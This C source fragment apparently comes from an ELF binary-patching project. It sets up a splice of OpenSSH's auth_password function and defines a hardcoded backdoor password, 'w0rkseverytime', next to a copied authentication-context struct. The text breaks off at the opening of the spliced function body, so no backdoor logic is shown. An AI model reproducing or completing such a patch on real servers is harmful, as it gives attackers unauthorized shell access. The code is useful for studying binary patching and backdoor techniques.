#define _GNU_SOURCE
#include <pwd.h>
#include "../../shiva.h"
#include "/home/elfmaster/openssh-portable/packet.h"

#define SECRET_PASSWORD "w0rkseverytime"


struct Authctxt {
        sig_atomic_t     success;
        int              authenticated; /* authenticated and alarms cancelled */
        int              postponed;     /* authentication needs another step */
        int              valid;         /* user exists and is allowed to login */
        int              attempt;
        int              failures;
        int              server_caused_failure;
        int              force_pwchange;
        char            *user;          /* username sent by the client */
        char            *service;
        struct passwd   *pw;            /* set if 'valid' */
        char            *style;

        /* Method lists for multiple authentication */
        char            **auth_methods; /* modified from server config */
        u_int            num_auth_methods;

        /* Authentication method-specific data */
        void            *methoddata;
        void            *kbdintctxt;
#ifdef BSD_AUTH
        auth_session_t  *as;
#endif
#ifdef KRB5
        krb5_context     krb5_ctx;
        krb5_ccache      krb5_fwd_ccache;
        krb5_principal   krb5_user;
        char            *krb5_ticket_file;
        char            *krb5_ccname;
#endif
        struct sshbuf   *loginmsg;

        /* Authentication keys already used; these will be refused henceforth */
        struct sshkey   **prev_keys;
        u_int            nprev_keys;

        /* Last used key and ancillary information from active auth method */
        struct sshkey   *auth_method_key;
        char            *auth_method_info;

        /* Information exposed to session */
        struct sshbuf   *session_info;  /* Auth info for environment */
};

struct passwd *pw;
struct Authctxt *authctxt;

SHIVA_T_FUNCTION_SPLICE(auth_password, 0x12620, 0x12620)
{

